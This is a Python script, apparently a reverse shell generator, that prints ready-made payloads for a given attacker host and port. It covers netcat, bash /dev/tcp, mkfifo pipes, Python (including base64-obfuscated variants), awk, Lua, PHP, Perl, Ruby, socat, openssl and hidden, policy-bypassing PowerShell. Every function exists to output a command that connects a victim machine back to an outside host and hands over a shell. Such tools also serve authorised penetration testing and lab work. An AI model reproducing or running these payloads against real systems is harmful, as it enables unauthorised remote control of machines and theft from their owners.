#!/usr/bin/env python3

import base64
import sys

from colorama import Fore, Style


BLUE_C = Style.BRIGHT + Fore.BLUE + '  '
RED_C = Style.BRIGHT + Fore.RED + '  '


def netcat_shell(address, port):
    print('\n' + BLUE_C + f'nc -e /bin/bash {address} {port}', end='\n\n')
    print(BLUE_C + f'nc -c bash {address} {port}', end='\n\n')
        

def bash_shell(address, port):
    print('\n' + BLUE_C + f'bash -i > /dev/tcp/{address}/{port} 0>&1 2>&1', end='\n\n')
    print(BLUE_C + f'bash -i > /dev/tcp/{address}/{port} 0<&1 2>&1', end='\n\n')
    print(BLUE_C + f'bash -i &> /dev/tcp/{address}/{port} 0>&1', end='\n\n')
    print(BLUE_C + f'bash -c \'bash -i &> /dev/tcp/{address}/{port} 0>&1\'', end='\n\n')
    print(BLUE_C + f'exec 69>&-; exec 69<>/dev/tcp/{address}/{port}; while read -r command; do $command >&69 2>&69; done <&69', end='\n\n')
    print(BLUE_C + f'exec bash -i < /dev/tcp/{address}/{port} >&0 2>&0', end='\n\n')
    print(BLUE_C + f'exec bash -i &> /dev/tcp/{address}/{port} <&1', end='\n\n')


def file_shell(address, port):
    print('\n' + BLUE_C + f'rm -f /tmp/f; mknod /tmp/f p; nc {address} {port} < /tmp/f | sh -i >/tmp/f 2>/tmp/f', end='\n\n')
    print(BLUE_C + f'rm -f /tmp/f; mkfifo /tmp/f; nc {address} {port} < /tmp/f | sh -i >/tmp/f 2>/tmp/f', end='\n\n')


def python_shell(address, port, version=''):

    code1 = f'''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{address}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("bash")'''
    
    code2 = f'''import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{address}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");p=subprocess.call(["bash","-i"])'''
    
    encoded_code1 = str(base64.b64encode(code1.encode("utf-8"))).split('\'')[1]
    encoded_code2 = str(base64.b64encode(code2.encode("utf-8"))).split('\'')[1]

    print('\n' + BLUE_C + f'python{version} -c \'{code1}\'', end='\n\n')
    print(BLUE_C + f'python{version} -c \'{code2}\'', end='\n\n')
    print(BLUE_C + f"python{version} -c \"import base64;exec(compile(base64.b64decode(b'{encoded_code1}'),'<string>','exec'))\"", end='\n\n')
    print(BLUE_C + f"python{version} -c \"import base64;exec(compile(base64.b64decode(b'{encoded_code2}'),'<string>','exec'))\"", end='\n\n')


def awk_shell(address, port):
    print('\n' + BLUE_C + f'awk \'BEGIN {{ s = "/inet/tcp/0/{address}/{port}"; while (1) {{ printf "$ " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c) }} }}\'', end='\n\n')


def lua_shell(address, port):
    print('\n' + BLUE_C + f'lua -e "require(\'socket\'); require(\'os\'); t=socket.tcp(); t:connect(\'{address}\',\'{port}\'); os.execute(\'bash -i <&3 >&3 2>&3\');"', end='\n\n')


def php_shell(address, port):
    print('\n' + BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});exec("bash -i <&3 >&3 2>&3");\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});shell_exec("bash -i <&3 >&3 2>&3");\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});`bash -i <&3 >&3 2>&3`;\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});system("bash -i <&3 >&3 2>&3");\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});passthru("bash -i <&3 >&3 2>&3");\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});popen("bash -i <&3 >&3 2>&3","r");\'', end='\n\n')
    print(BLUE_C + f'php -r \'$sock=fsockopen("{address}",{port});$proc=proc_open("bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'', end='\n\n')


def perl_shell(address, port):
    print('\n' + BLUE_C + f'perl -e \'use Socket;$i="{address}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");}};\'', end='\n\n')


def ruby_shell(address, port):
    print('\n' + BLUE_C + f'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{address}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'', end='\n\n')


def socat_shell(address, port):
    print('\n  Server: ' + Style.BRIGHT + Fore.BLUE + f'socat file:$(tty),raw,echo=0 tcp-listen:{port}', end='\n\n')
    print(Style.RESET_ALL + '  Victim: ' + Style.BRIGHT + Fore.RED + f'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{address}:{port}', end='\n\n')


def openssl_shell(address, port):
    print('\n  Server: ' + Style.BRIGHT + Fore.BLUE + f'ncat -nvlp {port} --ssl', end='\n\n')
    print(Style.RESET_ALL + '  Generating keys for server: ' + Style.BRIGHT + Fore.BLUE + 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes', end='\n\n')
    print(Style.RESET_ALL + '  Server: ' + Style.BRIGHT + Fore.BLUE + f'openssl s_server -quiet -key key.pem -cert cert.pem -port {port}', end='\n\n')
    print(Style.RESET_ALL + '  Server: ' + Style.BRIGHT + Fore.BLUE + f'ncat -nvlp {port} --ssl --ssl-key key.pem --ssl-cert cert.pem', end='\n\n')   
    print(BLUE_C + Style.RESET_ALL + 'Victim: ' + Style.BRIGHT + Fore.RED + f'rm -f /tmp/s 2>/dev/null; mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {address}:{port} > /tmp/s; rm -f /tmp/s 2>/dev/null', end='\n\n')


def powershell_shell(address, port):
    print('\n' + BLUE_C + f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{address}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()', end='\n\n')


if __name__ == "__main__":

    if len(sys.argv) in [4,5]:

        if sys.argv[3] == 'netcat':
            netcat_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'bash':
            bash_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'file':
            file_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'python':

            if len(sys.argv) == 4:
                python_shell(sys.argv[1], sys.argv[2])
            else:
                python_shell(sys.argv[1], sys.argv[2], sys.argv[4])
            
        elif sys.argv[3] == 'awk':
            awk_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'lua':
            lua_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'php':
            php_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'perl':
            perl_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'ruby':
            ruby_shell(sys.argv[1], sys.argv[2])
            
        elif sys.argv[3] == 'socat':
            socat_shell(sys.argv[1], sys.argv[2])

        elif sys.argv[3] == 'openssl':
            openssl_shell(sys.argv[1], sys.argv[2])

        elif sys.argv[3] == 'powershell':
            powershell_shell(sys.argv[1], sys.argv[2])
        
        else:
            print(Style.BRIGHT + Fore.RED + 'You chose invalid reverse shell type!')
            print(Style.RESET_ALL + 'Possible types: netcat, bash, file, python, awk, lua, php, perl, ruby, socat, openssl, powershell')
    else:
        print('Usage: revshellgen.py <LHOST> <LPORT> <TYPE> [PYTHON_VERSION]\nPossible types: netcat, bash, file, python, awk, lua, php, perl, ruby, socat, openssl, powershell')
